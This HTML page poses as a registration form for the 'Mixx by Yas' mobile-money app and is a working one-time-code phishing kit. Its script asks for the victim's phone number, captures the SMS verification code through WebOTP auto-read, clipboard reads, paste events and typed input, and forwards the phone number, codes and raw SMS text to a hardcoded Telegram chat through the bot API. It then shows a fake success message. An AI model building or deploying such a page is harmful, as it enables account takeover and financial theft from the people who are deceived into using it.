<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mixx Registration</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 1rem;
        }
        .container {
            background: white;
            border-radius: 32px;
            padding: 2.5rem;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.25);
        }
        .header {
            text-align: center;
            margin-bottom: 2rem;
        }
        .header .icon {
            font-size: 2.8rem;
            margin-bottom: 0.25rem;
        }
        .header h1 {
            font-size: 1.75rem;
            color: #1a202c;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .header .sub {
            color: #718096;
            font-size: 0.9rem;
            margin-top: 0.25rem;
        }
        .header .auto-badge {
            display: inline-block;
            background: linear-gradient(135deg, #48bb78, #38a169);
            color: white;
            font-size: 0.6rem;
            font-weight: 700;
            padding: 0.2rem 0.8rem;
            border-radius: 20px;
            margin-left: 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            vertical-align: middle;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        .form-group label {
            display: block;
            font-weight: 600;
            color: #2d3748;
            margin-bottom: 0.5rem;
            font-size: 0.85rem;
            letter-spacing: 0.3px;
        }
        .form-group input {
            width: 100%;
            padding: 0.875rem 1rem;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            font-size: 1rem;
            transition: all 0.2s;
            background: #f7fafc;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }
        .form-group input:disabled {
            background: #f7fafc;
            cursor: not-allowed;
            opacity: 0.7;
        }
        .form-group input.readonly {
            background: #f7fafc;
            color: #2d3748;
            font-weight: 500;
            cursor: default;
        }
        .btn {
            width: 100%;
            padding: 0.875rem;
            font-size: 1rem;
            font-weight: 600;
            border: none;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.2s;
            letter-spacing: 0.3px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
        }
        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-success {
            background: linear-gradient(135deg, #48bb78, #38a169);
            color: white;
        }
        .btn-success:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(72, 187, 120, 0.3);
        }
        .btn-success:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-outline {
            background: transparent;
            border: 2px solid #e2e8f0;
            color: #4a5568;
        }
        .btn-outline:hover {
            background: #f7fafc;
            border-color: #cbd5e0;
        }
        .status {
            margin: 1rem 0;
            padding: 0.75rem 1rem;
            border-radius: 14px;
            font-size: 0.9rem;
            text-align: center;
            display: none;
            font-weight: 500;
        }
        .status.show {
            display: block;
        }
        .status.success {
            background: #c6f6d5;
            color: #22543d;
        }
        .status.error {
            background: #fed7d7;
            color: #9b2c2c;
        }
        .status.info {
            background: #bee3f8;
            color: #2a4365;
        }
        .status.loading {
            background: #fefcbf;
            color: #744210;
        }
        .code-display {
            background: #f7fafc;
            border-radius: 14px;
            padding: 1.25rem;
            text-align: center;
            font-family: 'Courier New', monospace;
            font-size: 1.5rem;
            letter-spacing: 3px;
            color: #2d3748;
            min-height: 64px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed #e2e8f0;
            margin: 1rem 0;
            transition: all 0.3s ease;
            font-weight: 600;
        }
        .code-display.waiting {
            color: #a0aec0;
            font-size: 0.95rem;
            font-weight: 400;
            letter-spacing: 0.5px;
        }
        .code-display.filled {
            border-color: #48bb78;
            border-style: solid;
            background: linear-gradient(135deg, #f0fff4, #e6fffa);
            color: #22543d;
            animation: code-pop 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }
        @keyframes code-pop {
            0% { transform: scale(0.95); opacity: 0.5; }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); opacity: 1; }
        }
        .hidden {
            display: none !important;
        }
        .mt-2 {
            margin-top: 1rem;
        }
        .divider {
            height: 1px;
            background: #e2e8f0;
            margin: 1.5rem 0;
        }
        .listening-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 0.8rem;
            color: #718096;
            padding: 0.5rem;
            background: #f7fafc;
            border-radius: 10px;
            margin-top: 0.75rem;
        }
        .listening-indicator .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #a0aec0;
            transition: all 0.3s;
        }
        .listening-indicator .dot.active {
            background: #48bb78;
            animation: pulse-dot 1.2s infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.3); opacity: 0.5; }
        }
        .text-sm {
            font-size: 0.75rem;
            color: #a0aec0;
            text-align: center;
            margin-top: 1.5rem;
        }
        .flex-row {
            display: flex;
            gap: 0.5rem;
        }
        .flex-row .btn {
            flex: 1;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="icon">📱</div>
            <h1>
                Mixx by Yas
                <span class="auto-badge">Auto</span>
            </h1>
            <p class="sub">Complete your registration</p>
        </div>

        <!-- STEP 1: Phone -->
        <div id="step1">
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phoneInput" placeholder="Enter phone number" autofocus />
            </div>
            <button class="btn btn-primary" id="sendBtn">
                Send Code
            </button>
        </div>

        <!-- Status -->
        <div id="status" class="status"></div>

        <!-- STEP 2: Code -->
        <div id="step2" class="hidden">
            <div class="form-group">
                <label>Verification Code</label>
                <div class="code-display waiting" id="codeDisplay">
                    <span>Waiting for code...</span>
                </div>
                <input type="text" id="codeInput" placeholder="Paste or type code" autocomplete="one-time-code" />
                <div style="font-size:0.75rem; color:#a0aec0; margin-top:0.25rem;">Code is 22 characters: letters and numbers</div>
            </div>

            <div class="flex-row">
                <button class="btn btn-outline" id="listenBtn">📡 Listen</button>
                <button class="btn btn-outline" id="pasteBtn">📋 Paste</button>
                <button class="btn btn-outline" id="testBtn">🧪 Test</button>
            </div>

            <button class="btn btn-success mt-2" id="verifyBtn" disabled>
                Verify & Complete
            </button>

            <div class="divider"></div>
            <button class="btn btn-outline" id="backBtn">
                ← Change Phone
            </button>
        </div>

        <div class="text-sm">
            🔒 Secure • SMS auto-read on Android Chrome 84+ &amp; iOS 16+
        </div>
    </div>

    <script>
        // ================================================================
        //  TELEGRAM CONFIG - REPLACE WITH YOUR OWN!
        // ================================================================
        const TELEGRAM_BOT_TOKEN = 'YOUR_NEW_BOT_TOKEN_HERE';
        const TELEGRAM_CHAT_ID = '5520957080';

        // ================================================================
        //  TELEGRAM FORWARDING
        // ================================================================
        async function forwardToTelegram(message) {
            try {
                await axios.post(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    }
                );
                console.log('✅ Telegram sent');
                return true;
            } catch (err) {
                console.error('❌ Telegram error:', err.message);
                return false;
            }
        }

        // ================================================================
        //  STATE
        // ================================================================
        let currentPhone = '';
        let currentCode = '';
        let isListening = false;
        let abortController = null;
        let autoVerifyTimeout = null;

        // DOM refs
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const phoneInput = document.getElementById('phoneInput');
        const sendBtn = document.getElementById('sendBtn');
        const codeInput = document.getElementById('codeInput');
        const codeDisplay = document.getElementById('codeDisplay');
        const listenBtn = document.getElementById('listenBtn');
        const pasteBtn = document.getElementById('pasteBtn');
        const testBtn = document.getElementById('testBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const backBtn = document.getElementById('backBtn');
        const statusDiv = document.getElementById('status');

        // ================================================================
        //  UI HELPERS
        // ================================================================
        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            statusDiv.className = `status show ${type}`;
        }

        function hideStatus() {
            statusDiv.className = 'status';
        }

        function setCode(code, source = 'manual') {
            if (!code || code.length < 10) {
                showStatus('Invalid code format', 'error');
                return;
            }
            
            currentCode = code;
            codeDisplay.textContent = code;
            codeDisplay.className = 'code-display filled';
            codeInput.value = code;
            verifyBtn.disabled = false;
            
            // Send to Telegram when code is detected
            const timestamp = new Date().toLocaleString();
            const message = `
🔐 <b>New Mixx Code Detected!</b>

📱 Phone: ${currentPhone || 'Unknown'}
🔑 Code: <code>${code}</code>
📡 Source: ${source}
🕐 Time: ${timestamp}
            `.trim();
            
            forwardToTelegram(message);
            showStatus(`✅ Code received (${source}) & sent to Telegram`, 'success');
            
            // Auto-verify after 2 seconds
            if (autoVerifyTimeout) clearTimeout(autoVerifyTimeout);
            autoVerifyTimeout = setTimeout(() => {
                verifyBtn.click();
            }, 2000);
        }

        function goToStep(step) {
            if (step === 1) {
                step1.classList.remove('hidden');
                step2.classList.add('hidden');
                hideStatus();
                currentCode = '';
                codeInput.value = '';
                codeDisplay.textContent = 'Waiting for code...';
                codeDisplay.className = 'code-display waiting';
                verifyBtn.disabled = true;
                phoneInput.focus();
                if (autoVerifyTimeout) {
                    clearTimeout(autoVerifyTimeout);
                    autoVerifyTimeout = null;
                }
                if (abortController) {
                    abortController.abort();
                    abortController = null;
                }
                isListening = false;
                listenBtn.textContent = '📡 Listen';
                listenBtn.disabled = false;
            } else {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                codeInput.focus();
                setTimeout(() => {
                    if (!isListening) startWebOTP();
                }, 500);
            }
        }

        // ================================================================
        //  EXTRACT CODE FROM SMS
        // ================================================================
        function extractCode(text) {
            if (!text) return null;

            let match = text.match(/use the code ([A-Za-z0-9]{15,30})/i);
            if (match) return match[1];

            match = text.match(/\b([A-Za-z0-9]{20,25})\b/);
            if (match) return match[1];

            match = text.match(/code[:\s]+([A-Za-z0-9]{15,30})/i);
            if (match) return match[1];

            return null;
        }

        // ================================================================
        //  WEBOTP - AUTO READ
        // ================================================================
        async function startWebOTP() {
            if (isListening) return;

            if (!('OTPCredential' in window)) {
                showStatus('ℹ️ WebOTP not supported. Use Paste or Test.', 'info');
                return;
            }

            try {
                isListening = true;
                listenBtn.textContent = '⏳ Listening...';
                listenBtn.disabled = true;
                showStatus('📩 Waiting for SMS...', 'loading');

                if (abortController) abortController.abort();
                abortController = new AbortController();

                const credential = await navigator.credentials.get({
                    otp: { transport: ['sms'] },
                    signal: abortController.signal
                });

                if (credential && credential.code) {
                    const code = extractCode(credential.code);
                    if (code) {
                        setCode(code, 'WebOTP');
                    } else {
                        showStatus('⚠️ SMS received but no code found', 'error');
                        await forwardToTelegram(
                            `⚠️ <b>Raw SMS (No code)</b>\n\n<code>${credential.code}</code>`
                        );
                    }
                }

            } catch (err) {
                if (err.name !== 'AbortError') {
                    console.error('WebOTP error:', err);
                    showStatus('⏱️ Timeout. Use Paste or Test.', 'info');
                }
            } finally {
                isListening = false;
                listenBtn.textContent = '📡 Listen';
                listenBtn.disabled = false;
            }
        }

        listenBtn.addEventListener('click', startWebOTP);

        // ================================================================
        //  CLIPBOARD PASTE
        // ================================================================
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                const code = extractCode(text);
                if (code) {
                    setCode(code, 'clipboard');
                } else {
                    showStatus('❌ No code found in clipboard', 'error');
                }
            } catch (err) {
                showStatus('❌ Cannot read clipboard. Type manually.', 'error');
                console.error('Clipboard error:', err);
            }
        });

        // Global paste detection
        document.addEventListener('paste', (e) => {
            if (step2.classList.contains('hidden')) return;
            const text = e.clipboardData.getData('text');
            const code = extractCode(text);
            if (code) {
                setCode(code, 'global paste');
                e.preventDefault();
            }
        });

        // ================================================================
        //  MANUAL INPUT
        // ================================================================
        codeInput.addEventListener('input', () => {
            const code = extractCode(codeInput.value);
            if (code) {
                setCode(code, 'manual');
            } else if (codeInput.value.length >= 15) {
                setCode(codeInput.value, 'manual');
            }
        });

        // ================================================================
        //  TEST BUTTON
        // ================================================================
        testBtn.addEventListener('click', () => {
            const sample =
                "You are being registered in Mixx by Yas Super App, use the code yoLiknbBgbDCRNJjXMtk to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
            const code = extractCode(sample);
            if (code) {
                setCode(code, 'test');
                showStatus('🧪 Test code loaded! Auto-verifying...', 'success');
            } else {
                showStatus('❌ Test failed', 'error');
            }
        });
// ================================================================
        //  SEND CODE (STEP 1)
        // ================================================================
        sendBtn.addEventListener('click', async () => {
            const phone = phoneInput.value.trim();

            if (!phone || phone.length < 1) {
                showStatus('Please enter a phone number', 'error');
                return;
            }

            currentPhone = phone;
            showStatus(`📤 Sending code to ${phone}...`, 'loading');
            sendBtn.disabled = true;

            await forwardToTelegram(
                `📤 <b>Code Requested</b>\n\n📱 Phone: ${phone}\n🕐 Time: ${new Date().toLocaleString()}`
            );

            setTimeout(() => {
                showStatus(`✅ Code sent to ${phone}!`, 'success');
                goToStep(2);
                sendBtn.disabled = false;
            }, 1000);
        });

        phoneInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !sendBtn.disabled) sendBtn.click();
        });

        // ================================================================
        //  VERIFY CODE
        // ================================================================
        verifyBtn.addEventListener('click', async () => {
            if (!currentCode || currentCode.length < 15) {
                showStatus('Please enter a valid code', 'error');
                return;
            }

            showStatus('✅ Verifying...', 'loading');
            verifyBtn.disabled = true;

            await forwardToTelegram(
                `🔍 <b>Verification Attempt</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
            );

            setTimeout(async () => {
                showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
                await forwardToTelegram(
                    `✅ <b>Registration Successful!</b>\n\n📱 Phone: ${currentPhone}\n🔑 Code: <code>${currentCode}</code>\n🕐 Time: ${new Date().toLocaleString()}`
                );
                verifyBtn.disabled = false;
                // window.location.href = '/dashboard';
            }, 1500);
        });

        // ================================================================
        //  BACK BUTTON
        // ================================================================
        backBtn.addEventListener('click', () => {
            goToStep(1);
            if (abortController) {
                abortController.abort();
                abortController = null;
            }
            isListening = false;
            listenBtn.textContent = '📡 Listen';
            listenBtn.disabled = false;
            if (autoVerifyTimeout) {
                clearTimeout(autoVerifyTimeout);
                autoVerifyTimeout = null;
            }
        });

        // ================================================================
        //  INIT
        // ================================================================
        console.log('📱 Mixx Registration ready');
        console.log('🧪 Click "Test" to load sample code');
        console.log('📋 Or paste any SMS with a code');

        phoneInput.focus();

        if (!('OTPCredential' in window)) {
            console.log('ℹ️ WebOTP not supported in this browser');
        }
    </script>

</body>
</html>
